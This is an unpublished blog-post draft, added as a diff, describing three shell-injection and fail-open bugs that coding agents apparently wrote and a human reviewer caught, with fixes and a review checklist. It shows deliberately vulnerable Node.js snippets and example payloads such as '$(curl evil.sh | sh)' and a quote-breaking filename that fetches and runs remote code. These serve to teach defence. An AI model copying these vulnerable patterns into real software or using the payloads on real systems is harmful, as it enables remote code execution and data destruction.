@@ -1,0 +1,141 @@
+---
+title: "The Shell-Injection Bugs My Agents Wrote (and the Tests Passed)"
+date: "2026-07-08"
+tags: ["ai", "security", "code-review", "claude-code", "software-engineering"]
+description: "Three real shell-injection vulnerabilities coding agents wrote, that automated tests passed, and that a senior human caught before merge — proof AI code needs adversarial review, not just green CI."
+published: false
+language: "en"
+---
+
+> **The short version:** Over one delivery run, my coding agents wrote three separate shell-injection vulnerabilities. Every automated test passed. CI was green. A senior human review caught all three before they merged. This is the whole argument for keeping a person accountable between agent speed and production: passing tests prove the code does what the tests check — not that it's safe.
+
+Yes, AI writes insecure code. I know because I ship a lot of it, and then I catch it.
+
+I run fleets of Claude Code agents to clear backlog — 30 reviewed PRs across nine batches in two and a half days is a real, measured example. That's the "ship" half. The "verify" half is me, reading every diff before it merges, assuming the agent got it wrong until I've proven it didn't. That habit comes from fintech, where a mistake costs money instead of a rerun.
+
+This post is about three times that habit paid for itself. Three shell-injection bugs the agents wrote, that the test suite waved through, that I caught on review. The specifics are generalized below to stay on the safe side of client confidentiality — but the failure patterns are exactly what I saw.
+
+> **NEEDS FROM ADI:** Confirm how much of the actual vulnerable code and repo context can be shown. The code sketches below are sanitized, representative reconstructions of the vulnerability *class*, not verbatim client code. If any real (non-Bono, non-confidential) snippet from the `codin` harness work can be shown verbatim, it will land harder than a reconstruction — flag which of the three, if any.
+
+## Why "the tests passed" is not the reassurance it sounds like
+
+An automated test asserts that code behaves a certain way on the inputs the test author thought to write. Agents are extraordinarily good at making tests pass — that's literally the reward signal they optimize against. Give an agent a failing test and it will make it green. That's a feature for throughput and a trap for safety, because "green" and "safe" are different properties.
+
+Shell injection is the perfect example. The vulnerable path only triggers on a *malicious* input — a semicolon, a backtick, a `$(...)`. No test suite written to prove the happy path works will ever send those. So the code passes, ships, and sits there until someone hostile types the input the test author never imagined. The agent didn't lie. It just answered a narrower question than the one that matters.
+
+Here are the three.
+
+## Vuln 1 — A branch name interpolated straight into a shell
+
+The agent built a small tool that ran a git command using a ref name it received as input. It reached for the easy path:
+
+```js
+// Representative reconstruction — do not ship
+const { execSync } = require("child_process");
+
+function checkoutRef(ref) {
+  // ref comes from an API request / ticket field
+  return execSync(`git checkout ${ref}`).toString();
+}
+```
+
+`execSync` runs its argument through `/bin/sh`. So `ref = "main; rm -rf /tmp/data"` runs both commands. `ref = "$(curl evil.sh | sh)"` is worse. The tests passed something like `checkoutRef("main")` and `checkoutRef("feature/login")`, asserted the right branch came back, and went green. Nothing in the suite ever sent a shell metacharacter, because why would it — the author was testing that checkout works, not that checkout resists attack.
+
+**The fix** is to never build a shell string from untrusted input: use the argument-array form (`execFile`/`spawn` with an args array, no `shell: true`), so the ref is passed as one opaque argument the shell never parses.
+
+```js
+const { execFileSync } = require("child_process");
+execFileSync("git", ["checkout", "--", ref]); // ref can't break out of its slot
+```
+
+I catch this one by grepping every diff for `exec`, `execSync`, and `shell: true`, then asking a single question of each hit: *where does every interpolated value come from, and what happens if it contains a semicolon?* The agent never asks that question. It's not in the reward signal.
+
+## Vuln 2 — A security gate that failed open
+
+This is the one that actually scared me, because the agent wrote a *security check* and the check itself was the hole.
+
+The task was a pre-commit guard: run a secret scanner as a subprocess, block the commit if the scanner finds anything. The agent wrote it like this:
+
+```js
+// Representative reconstruction — do not ship
+const result = spawnSync("secret-scanner", ["--scan", diffPath]);
+if (result.status !== 0) {
+  throw new Error("Secrets detected — commit blocked");
+}
+// status === 0 → allowed to proceed
+```
+
+Read the failure mode. If the scanner runs and finds nothing, `status` is `0` — allowed, correct. If it finds a secret, `status` is non-zero — blocked, correct. But if the scanner binary isn't installed, or the OS refuses to spawn it, `spawnSync` returns `{ status: null, error: <Error> }`. `null !== 0` is... `false`. The `if` doesn't fire. The commit sails through. **The gate whose entire job is to block bad traffic silently allows everything the moment it can't run.**
+
+Every test passed, of course — CI had the scanner installed, so `status` was always a real number. Nobody wrote the test where the binary is missing, because that's not a behavior anyone was thinking about. It's a non-behavior.
+
+**The fix** is that a security gate fails *closed*: if the check can't run, that counts as "blocked," not "allowed."
+
+```js
+const result = spawnSync("secret-scanner", ["--scan", diffPath]);
+if (result.error || result.status === null || result.status !== 0) {
+  throw new Error("Secret scan failed or found secrets — commit blocked");
+}
+```
+
+The general rule I apply to every agent-written guard: *"I don't know" must produce the same answer as "no."* An empty allowlist blocks everything. An unset required env var refuses. A subprocess that didn't run is a failure, not a pass. Agents default to the optimistic branch every time, because the optimistic branch is the one that makes the happy-path test green.
+
+## Vuln 3 — Command substitution through a "safe-looking" filename
+
+The third one hid inside a file-processing step. The agent shelled out to a media/utility CLI and built the command from a user-supplied filename:
+
+```js
+// Representative reconstruction — do not ship
+exec(`process-file "${userFilename}" --out result.png`, cb);
+```
+
+The quotes *look* like they sanitize it. They don't. A filename of `x"; curl evil.sh | sh; echo "` closes the quote, injects a command, and reopens one so the rest parses. Command substitution — `$(...)` or backticks inside the filename — executes before the outer command even runs. The tests uploaded `photo.png` and `document.pdf`, got the expected output, and passed. Attacker-controlled filenames are one of the oldest injection vectors there is, and the agent walked straight into it while producing code that read as perfectly reasonable.
+
+**The fix** is the same discipline as Vuln 1 — pass the filename as an argument, not as shell text — plus validating the filename against an allowlist of expected characters before it goes anywhere near a subprocess.
+
+## The pattern across all three
+
+None of these were exotic. Every one was a case of the agent choosing the shortest path to working code — string interpolation into a shell, an exit-code check that only considered the happy exit — and the test suite confirming the happy path while staying blind to the adversarial one. That's not a Claude problem or a GPT problem. It's structural: **agents optimize to green, and green is a floor, not a ceiling.**
+
+That's also why I don't trust "we have 90% test coverage" as a safety statement for agent-written code. Coverage measures which lines ran, not which threats were considered. The injection line ran in every test — with a benign input.
+
+## Why this is non-negotiable in fintech
+
+I learned to review this way building where mistakes move money. In that world you assume the input is hostile, you assume the dependency will be missing in prod, and you assume the person on the other end is smarter and angrier than your test author. That posture is exactly what agent code needs, because the agent has none of it — it has a reward signal and no sense of consequence.
+
+Speed without that review step is a liability. A fleet of agents will hand you shell-injection bugs faster than a single human ever could, wrapped in passing tests and a green pipeline that tells you everything is fine. The throughput is real. So is the risk. The job is to keep both.
+
+## How I actually catch these on review
+
+Short version of the process (the longer version is its own post):
+
+1. **Grep the diff for the dangerous surface first** — `exec`, `spawn`, `shell: true`, string-built SQL, `dangerouslySetInnerHTML`, anything that reaches a shell, a query, or the DOM.
+2. **Trace every interpolated value to its source.** If untrusted input reaches a shell string, it's a finding — no benefit of the doubt.
+3. **Check every gate's failure mode, not just its success mode.** What happens when the subprocess doesn't run, the config is empty, the env var is unset? If "I don't know" isn't "blocked," it's a finding.
+4. **Assume the tests are complicit.** Green tells me the happy path works. It tells me nothing about the adversarial path. I write the missing negative case or reject the PR.
+
+That's the verify half of ship/verify, and it's the half nobody selling you a "100x" multiplier wants to talk about.
+
+## FAQ
+
+**Does AI write insecure code?**
+Yes. In one delivery run my agents produced three separate shell-injection vulnerabilities, all of which passed the automated tests. AI coding agents optimize to make tests pass, and standard tests exercise valid inputs — so injection flaws, which only trigger on malicious input, ship green. Unreviewed AI-generated code is frequently insecure.
+
+**Do automated tests catch AI-written security bugs?**
+Usually not. Tests assert behavior on the inputs the author thought to write, and nobody writes happy-path tests with a `; rm -rf` in them. A shell-injection or fail-open bug can pass 100% of a test suite because the vulnerable branch only executes on inputs the tests never send. Green CI is a floor, not a safety guarantee.
+
+**How do you review AI-generated code for vulnerabilities?**
+Assume the agent got it wrong until proven safe. Grep the diff for dangerous surfaces (shell calls, string-built queries, raw HTML), trace every untrusted value to where it's used, check that every security gate fails *closed* when it can't run, and treat passing tests as evidence about the happy path only. A senior human reads every diff before merge.
+
+**What is shell injection in AI-generated code?**
+Shell injection happens when untrusted input is interpolated into a command string that's passed to a shell (via `exec`, `execSync`, or `shell: true`), letting an attacker run arbitrary commands with characters like `;`, `|`, backticks, or `$(...)`. Agents produce it often because string interpolation is the shortest path to code that passes the happy-path test.
+
+---
+
+## Ship fast. Verify like it's going to prod.
+
+Every Agent-Accelerated Delivery Sprint ships fixed-scope, fixed-price reviewed PRs in days — and every PR is adversarially reviewed for security before it merges. You get the throughput of a fleet of agents and a senior engineer accountable for what lands, with a report of what got flagged and fixed, not just what shipped.
+
+**[Book a scoping call →](/#contact)** — tell me the backlog, I'll tell you the honest number.
+
+*4–5x, not 100x — and here's what the agents get wrong.*
